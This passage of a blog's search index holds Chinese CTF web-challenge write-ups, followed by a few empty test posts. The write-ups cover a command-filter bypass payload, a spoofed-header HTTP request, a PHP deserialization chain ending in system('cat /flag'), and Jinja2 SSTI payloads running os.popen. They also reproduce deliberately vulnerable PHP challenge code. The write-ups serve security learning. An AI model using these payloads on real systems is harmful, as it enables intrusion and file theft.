class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$rce</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;rce&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$rce</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="hljs-variable">$rce</span>)) &#123;<br>        system(<span class="hljs-variable">$rce</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hhhhhhacker!!!&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.考察知识<br>命令执行漏洞绕过<br><span class="hljs-number">2</span>.解决方法<br>构造payload:rce=whoami可知直接通过过滤执行cat flag即可<br>百度常见绕过方式，可得<br>构造payload:rce=ca\t<span class="hljs-variable">$&#123;IFS&#125;</span>fla\g.php即可<br>详情请参考博客:https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/SpouseLJ/</span>p/<span class="hljs-number">13223967</span>.html<br><br></code></pre></td></tr></table></figure><h6 id="8-Do-you-know-HTTP"><a href="#8-Do-you-know-HTTP" class="headerlink" title="8.Do you know HTTP?"></a>8.Do you know HTTP?</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.考察知识<br>http header<br><span class="hljs-number">2</span>.解决方法<br>网页发现给出三个提示<br><span class="hljs-number">1</span>)用<span class="hljs-string">&#x27;HS&#x27;</span>来请求试试？<br><span class="hljs-number">2</span>)只有本地ip地址才可以哦！<br><span class="hljs-number">3</span>)<span class="hljs-string">&#x27;LT&#x27;</span>才是本题官方浏览器哦！<br>利用bp抓包按需更改请求包为<br>HS <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br>        Host: <span class="hljs-number">47.93</span>.<span class="hljs-number">215.154</span>:<span class="hljs-number">5002</span><br>        Cache-Control: max-age=<span class="hljs-number">0</span><br>        Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>        User-Agent: LT<br>        Accept: text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>avif,image<span class="hljs-regexp">/webp,image/</span>apng,*<span class="hljs-regexp">/*;q=0.8,application/</span>signed-exchange;v=b3;q=<span class="hljs-number">0.9</span><br>        Accept-Encoding: gzip, deflate<br>        Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>        Connection: close<br>        X-Forwarded-For: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>        Referer: www.ltyyds.com<br>        即可<br></code></pre></td></tr></table></figure><h6 id="9-eeeeeeeeeeezunserialize"><a href="#9-eeeeeeeeeeezunserialize" class="headerlink" title="9.eeeeeeeeeeezunserialize"></a>9.eeeeeeeeeeezunserialize</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码:<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">entrance</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;start = <span class="hljs-variable">$start</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;start-&gt;helloworld();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">springboard</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$middle</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;middle-&gt;hs;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$end</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;end = <span class="hljs-variable">$end</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$Attribute</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;end);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;serialize&#x27;</span>])) &#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;serialize&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">1.</span>考察知识<br>php魔方方法 php序列化/反序列化<br><span class="hljs-number">2.</span>解题方法<br><span class="hljs-number">1</span>)审查源代码可发现存在<span class="hljs-built_in">eval</span>()危险函数<br><span class="hljs-number">2</span>)分析代码逻辑及类名可知思路<br>entrance创建(销毁时调用springboard.call方法)-&gt;springboard创建-&gt;springboard.call调用创建evil方法-&gt;执行evil成员变量end=system(<span class="hljs-string">&#x27;cat flag&#x27;</span>);<br><span class="hljs-number">3</span>)利用phpstudy本地脚本输出<br>$payload = <span class="hljs-keyword">new</span> entrance(<span class="hljs-keyword">new</span> springboard(<span class="hljs-keyword">new</span> evil(<span class="hljs-string">&quot;system(&#x27;cat flag&#x27;);&quot;</span>)));<br>echo serialize($payload);<br>得到序列化后的payload:O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;entrance&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;springboard&quot;</span>:<span class="hljs-number">1</span>: &#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;middle&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;&#125;&#125;<br><span class="hljs-number">4</span>)get传入payload即可<br><span class="hljs-number">3.</span>思考<br><span class="hljs-number">1</span>)初做此题时看到源代码中调用不存在的方法和变量时，没有仔细思考导致未做出来,感谢@Ghost1032&amp;&amp;@CyXq指点<br><span class="hljs-number">2</span>)问:为什么根据本地更改后的php代码得到的payload可以用到原题中的php代码中？<br>答:序列化对象的时候，只会保存属性值。不保存常量的值，故无关<br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">魔术方法</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center"><strong>__construct()</strong></td><td align="center"><strong>对象初始化时会调用此方法</strong></td></tr><tr><td align="center"><strong>__destruct()</strong></td><td align="center"><strong>对象销毁时会调用此方法</strong></td></tr><tr><td align="center"><strong>__get()</strong></td><td align="center"><strong>获取对象的属性为不允许访问/不存在，此方法会被调用</strong></td></tr><tr><td align="center"><strong>__call()</strong></td><td align="center"><strong>获取对象的方法为不允许访问/不存在，此方法会被调用</strong></td></tr></tbody></table><h6 id="10-让-我-访-问"><a href="#10-让-我-访-问" class="headerlink" title="10.让 我 访 问"></a>10.让 我 访 问</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">题目分析:<br>F12查看源码可看到有两个表单<br>&lt;form <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;/login.do&quot;</span> <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;&lt;/form&gt;<br>&lt;form <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;/action&quot;</span> <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;&lt;/form&gt;<br>由题目提示及高人指点可知register表单存在SSTI注入<br>之后进行测试即可<br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">解题方法:</span><br><span class="xml">1)利用bp抓包register接口，发现传入post参数goto，更改goto值，发现页面存在回显注入</span><br><span class="xml">2)手动测试goto=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">3</span>*<span class="hljs-number">9</span>&#125;&#125;</span><span class="xml">,goto=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">3</span>*<span class="hljs-string">&#x27;9&#x27;</span>&#125;&#125;</span><span class="xml">,均回显27即可确定模板引擎为Jinja2</span><br><span class="xml">3)根据之前bugku所写相关题目Simple_SSTI_2套用payload模板</span><br><span class="xml">4)payload: </span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">20config.__class__.__init__.__globals__</span>[%27os%27].popen(%<span class="hljs-name">27ls</span>%<span class="hljs-number">20</span>../%<span class="hljs-number">27</span>).read()%<span class="hljs-number">20</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml">ls当前文件夹所有文件</span><br><span class="xml">回显bin dev etc flag home lib lib64 media...</span><br><span class="xml">发现关键字眼flag</span><br><span class="xml">5)payload:</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">20config.__class__.__init__.__globals__</span>[%27os%27].popen(%<span class="hljs-name">27cat</span>%<span class="hljs-number">20</span>../flag%<span class="hljs-number">27</span>).read()%<span class="hljs-number">20</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml">cat flag文件</span><br><span class="xml">即可得到flag</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">总结反思:</span><br>1)初拿到题目是判断为sql注入,没有考虑到题目提示且缺乏经验且不仔细审查源码,故没有找到注入点,经高人提示后才想起之前所写过的SSTI题目。<br>2)执迷于题目所给的WAF未遂导致无果。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/09/25/passage5/"/>
    <url>/2021/09/25/passage5/</url>
    
    <content type="html"><![CDATA[<p>第三篇测试文章，我好难…</p>]]></content>
    
    
    
    <tags>
      
      <tag>tags测试2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/06/10/passage6/"/>
    <url>/2021/06/10/passage6/</url>
    
    <content type="html"><![CDATA[<p>第四篇测试文章，我好难…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>我是火星人吗？？？</p><p>woshi</p>]]></content>
    
    
    
    <tags>
      
      <tag>tags测试1</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
